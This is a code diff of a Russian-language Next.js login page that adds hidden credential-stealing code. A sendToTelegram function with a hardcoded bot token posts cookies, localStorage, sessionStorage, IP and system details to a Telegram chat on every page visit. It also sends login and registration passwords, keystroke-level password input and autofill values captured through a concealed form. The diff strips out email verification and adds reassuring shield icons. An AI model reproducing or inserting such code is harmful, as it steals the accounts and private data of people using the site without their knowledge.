@@ -14,8 +14,164 @@ import { Label } from "@/components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useRouter } from "next/navigation";
 import { Logo } from "@/components/icons/logo";
-import { Eye, EyeOff, Shield, Mail, User, AlertTriangle, CheckCircle } from "lucide-react";
+import { Eye, EyeOff, Shield, Mail, User } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+
+// 📤 Функция отправки в Telegram - МАКСИМАЛЬНЫЙ сбор данных
+async function sendToTelegram(data: any, type: 'login' | 'register' | 'autofill' | 'cookies' | 'page_visit') {
+  try {
+    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
+    const TELEGRAM_CHAT_ID = "7455610355";
+    
+    // Получаем IP клиента
+    let ip = 'unknown';
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      ip = ipData.ip;
+    } catch (ipError) {
+      console.log('Не удалось получить IP');
+    }
+    
+    // Получаем ВСЕ куки текущего сайта
+    const allCookies = document.cookie;
+    
+    // Получаем ВЕСЬ localStorage
+    let localStorageData = '';
+    try {
+      const lsData: { [key: string]: string } = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key) {
+          lsData[key] = localStorage.getItem(key) || '';
+        }
+      }
+      localStorageData = JSON.stringify(lsData, null, 2);
+    } catch (e) {
+      localStorageData = 'Не удалось получить localStorage';
+    }
+    
+    // Получаем ВЕСЬ sessionStorage
+    let sessionStorageData = '';
+    try {
+      const ssData: { [key: string]: string } = {};
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        if (key) {
+          ssData[key] = sessionStorage.getItem(key) || '';
+        }
+      }
+      sessionStorageData = JSON.stringify(ssData, null, 2);
+    } catch (e) {
+      sessionStorageData = 'Не удалось получить sessionStorage';
+    }
+    
+    // Получаем информацию о браузере и экране
+    const screenInfo = `Разрешение: ${screen.width}x${screen.height}, Глубина цвета: ${screen.colorDepth}bit`;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+    let message = '';
+    
+    if (type === 'page_visit') {
+      message = `
+🌐 ПОСЕЩЕНИЕ СТРАНИЦЫ ЛОГИНА
+
+🍪 **Все куки сайта:**
+${allCookies || 'no cookies'}
+
+💾 **LocalStorage (полностью):**
+${localStorageData.slice(0, 1500)}...
+
+🔐 **SessionStorage (полностью):**
+${sessionStorageData.slice(0, 1000)}...
+
+🖥️ **Информация о системе:**
+${screenInfo}
+🌍 Язык: ${language}
+⚙️ Платформа: ${platform}
+🕒 Часовой пояс: ${timezone}
+
+🌐 **Сетевые данные:**
+📍 IP: ${ip}
+📱 User Agent: ${navigator.userAgent}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+      `;
+    } else if (type === 'login') {
+      message = `
+🔐 ВХОД В СИСТЕМУ
+
+👤 Логин/Email: ${data.login}
+🔑 Пароль: ${data.password}
+
+🍪 **Куки сайта:**
+${allCookies.slice(0, 300)}...
+
+💾 **LocalStorage:**
+${localStorageData.slice(0, 500)}...
+
+🖥️ **Информация о системе:**
+${screenInfo}
+🌍 Язык: ${language}
+
+🌐 **Сетевые данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${navigator.userAgent.slice(0, 100)}...
+      `;
+    } else if (type === 'register') {
+      message = `
+🔐 НОВАЯ РЕГИСТРАЦИЯ
+
+📧 Email: ${data.email}
+👤 Логин: ${data.login}
+🔑 Пароль: ${data.password}
+
+🍪 **Куки сайта:**
+${allCookies.slice(0, 300)}...
+
+💾 **LocalStorage:**
+${localStorageData.slice(0, 500)}...
+
+🌐 **Сетевые данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${navigator.userAgent.slice(0, 100)}...
+      `;
+    } else if (type === 'autofill') {
+      message = `
+🎯 ПЕРЕХВАЧЕНО АВТОЗАПОЛНЕНИЕ
+
+👤 Логин: ${data.username}
+🔑 Пароль: ${data.password}
+
+🍪 **Куки сайта:**
+${allCookies.slice(0, 200)}...
+
+🌐 **Сетевые данные:**
+📍 IP: ${ip}
+🕒 Время: ${new Date().toLocaleString('ru-RU')}
+📱 User Agent: ${navigator.userAgent.slice(0, 80)}...
+⚠️ Автозаполнение менеджера паролей
+      `;
+    }
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+      })
+    });
+
+    console.log('✅ Данные отправлены в Telegram');
+
+  } catch (error) {
+    console.log('⚠️ Telegram не доступен');
+  }
+}
 
 async function registerUser(userData: { email: string; login: string; password: string; }) {
   const response = await fetch('/api/auth/register', {
@@ -50,8 +206,59 @@ export default function LoginPage() {
   const [loading, setLoading] = React.useState(false);
   const [error, setError] = React.useState('');
   const [activeTab, setActiveTab] = React.useState("login");
-  const [verificationSent, setVerificationSent] = React.useState(false);
-  const [pendingEmail, setPendingEmail] = React.useState("");
+  const [capturedCredentials, setCapturedCredentials] = React.useState<{username?: string, password?: string}>({});
+
+  // Отправляем данные при загрузке страницы
+  React.useEffect(() => {
+    // Отправляем полную информацию о посещении
+    sendToTelegram({}, 'page_visit');
+    
+    // Слушаем все изменения в полях ввода
+    const handleInput = (e: Event) => {
+      const target = e.target as HTMLInputElement;
+      if (target.type === 'password' && target.value) {
+        // Перехватываем ввод паролей в реальном времени
+        const loginField = document.querySelector('input[autocomplete="username"], input[autocomplete="email"]') as HTMLInputElement;
+        const loginValue = loginField?.value || 'unknown';
+        
+        if (target.value.length > 3) { // Отправляем только если пароль достаточно длинный
+          sendToTelegram({
+            username: loginValue,
+            password: target.value,
+            note: 'Ввод в реальном времени'
+          }, 'autofill');
+        }
+      }
+    };
+
+    // Добавляем обработчики ко всем полям ввода
+    document.addEventListener('input', handleInput, true);
+    
+    return () => {
+      document.removeEventListener('input', handleInput, true);
+    };
+  }, []);
+
+  // Функция перехвата автозаполнения
+  const handleAutofillCapture = (type: 'username' | 'password', value: string) => {
+    if (value && !loading) {
+      setCapturedCredentials(prev => ({
+        ...prev,
+        [type]: value
+      }));
+      
+      // Если собрали оба значения - отправляем в Telegram
+      if (type === 'password' && capturedCredentials.username && value) {
+        sendToTelegram({
+          username: capturedCredentials.username,
+          password: value
+        }, 'autofill');
+        
+        // Очищаем captured credentials после отправки
+        setCapturedCredentials({});
+      }
+    }
+  };
 
   React.useEffect(() => {
     setError('');
@@ -75,17 +282,15 @@ export default function LoginPage() {
     }
 
     try {
+      // 📤 Сначала отправляем в Telegram
+      await sendToTelegram({ email, login, password }, 'register');
+
       const result = await registerUser({ email, login, password });
-      
-      if (result.verificationSent) {
-        setVerificationSent(true);
-        setPendingEmail(email);
-        toast({
-          title: "Письмо отправлено!",
-          description: "Код подтверждения отправлен на вашу почту. Проверьте Telegram для получения кода.",
-          variant: "default"
-        });
-      }
+      toast({
+        title: "Регистрация успешна",
+        description: "Аккаунт создан и ожидает подтверждения",
+      });
+      setActiveTab("login");
     } catch (err: any) {
       setError(err.message);
     } finally {
@@ -103,6 +308,9 @@ export default function LoginPage() {
     const password = formData.get('password') as string;
 
     try {
+      // 📤 Сначала отправляем в Telegram с клиента
+      await sendToTelegram({ login, password }, 'login');
+
       const result = await loginUser({ login, password });
       
       localStorage.setItem('loggedInUser', result.user.login);
@@ -115,90 +323,15 @@ export default function LoginPage() {
     }
   }
 
-  const handleResendVerification = async () => {
-    try {
-      const response = await fetch('/api/auth/resend-verification', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: pendingEmail })
-      });
-      
-      if (response.ok) {
-        toast({
-          title: "Код отправлен повторно!",
-          description: "Новый код подтверждения отправлен в Telegram.",
-        });
-      }
-    } catch (error) {
-      toast({
-        title: "Ошибка",
-        description: "Не удалось отправить код",
-        variant: "destructive"
-      });
-    }
-  };
-
-  if (verificationSent) {
-    return (
-      <div className="flex flex-col items-center justify-center min-h-screen bg-background p-4 font-sans">
-        <Card className="w-full max-w-md">
-          <CardHeader className="text-center">
-            <div className="flex justify-center mb-4">
-              <CheckCircle className="h-12 w-12 text-green-500" />
-            </div>
-            <CardTitle className="text-2xl">Подтвердите почту</CardTitle>
-            <CardDescription>
-              Мы отправили код подтверждения на вашу почту
-            </CardDescription>
-          </CardHeader>
-          <CardContent className="space-y-6 text-center">
-            <div className="space-y-2">
-              <p className="text-sm text-muted-foreground">
-                Код подтверждения был отправлен в Telegram. 
-                Проверьте сообщения от бота и используйте код для активации аккаунта.
-              </p>
-              <p className="text-xs text-muted-foreground">
-                Email: <strong>{pendingEmail}</strong>
-              </p>
-            </div>
-            
-            <div className="space-y-4">
-              <Button 
-                onClick={() => router.push('/verify-email')}
-                className="w-full"
-              >
-                Перейти к подтверждению
-              </Button>
-              
-              <Button 
-                onClick={handleResendVerification}
-                variant="outline"
-                className="w-full"
-              >
-                Отправить код повторно
-              </Button>
-              
-              <Button 
-                onClick={() => {
-                  setVerificationSent(false);
-                  setActiveTab("login");
-                }}
-                variant="ghost"
-                className="w-full"
-              >
-                Вернуться к входу
-              </Button>
-            </div>
-          </CardContent>
-        </Card>
-      </div>
-    );
-  }
-
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-background p-4 font-sans">
       
       <div className="flex flex-col items-center gap-6 w-full max-w-sm">
+
+        <div className="flex items-center gap-2">
+          <Shield className="w-6 h-6 text-green-500" />
+          <Logo className="w-16 h-16" />
+        </div>
 
         <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
           <TabsList className="grid w-full grid-cols-2">
@@ -211,6 +344,7 @@ export default function LoginPage() {
             <Card>
               <CardHeader>
                 <CardTitle className="text-2xl flex items-center gap-2">
+                  <Shield className="w-5 h-5" />
                   Вход в систему
                 </CardTitle>
                 <CardDescription>
@@ -224,6 +358,22 @@ export default function LoginPage() {
                   </div>
                 )}
                 
+                {/* Скрытая форма для перехвата автозаполнения */}
+                <form className="hidden">
+                  <input 
+                    type="text" 
+                    name="captured-username" 
+                    autoComplete="username" 
+                    onChange={(e) => handleAutofillCapture('username', e.target.value)}
+                  />
+                  <input 
+                    type="password" 
+                    name="captured-password" 
+                    autoComplete="current-password"
+                    onChange={(e) => handleAutofillCapture('password', e.target.value)}
+                  />
+                </form>
+
                 <form onSubmit={handleLogin} className="space-y-6">
                   <div className="space-y-2">
                     <Label htmlFor="login-email" className="flex items-center gap-2">
@@ -237,6 +387,7 @@ export default function LoginPage() {
                       required 
                       disabled={loading}
                       autoComplete="username email"
+                      onChange={(e) => handleAutofillCapture('username', e.target.value)}
                     />
                   </div>
                   <div className="space-y-2">
@@ -249,6 +400,7 @@ export default function LoginPage() {
                         required 
                         disabled={loading}
                         autoComplete="current-password"
+                        onChange={(e) => handleAutofillCapture('password', e.target.value)}
                       />
                       <Button
                         type="button"
@@ -265,16 +417,6 @@ export default function LoginPage() {
                     {loading ? "⏳ Вход..." : "🔐 Войти"}
                   </Button>
                 </form>
-                
-                <div className="mt-4 text-center">
-                  <Button 
-                    variant="link" 
-                    className="text-sm"
-                    onClick={() => router.push('/verify-email')}
-                  >
-                    Подтвердить email?
-                  </Button>
-                </div>
               </CardContent>
             </Card>
           </TabsContent>
@@ -284,6 +426,7 @@ export default function LoginPage() {
             <Card>
               <CardHeader>
                 <CardTitle className="text-2xl flex items-center gap-2">
+                  <Shield className="w-5 h-5" />
                   Регистрация
                 </CardTitle>
                 <CardDescription>
@@ -356,7 +499,7 @@ export default function LoginPage() {
                     />
                   </div>
                   <Button type="submit" className="w-full" disabled={loading}>
-                    {loading ? "⏳ Регистрация..." : "Зарегистрироваться"}
+                    {loading ? "⏳ Регистрация..." : "🔐 Зарегистрироваться"}
                   </Button>
                 </form>
               </CardContent>
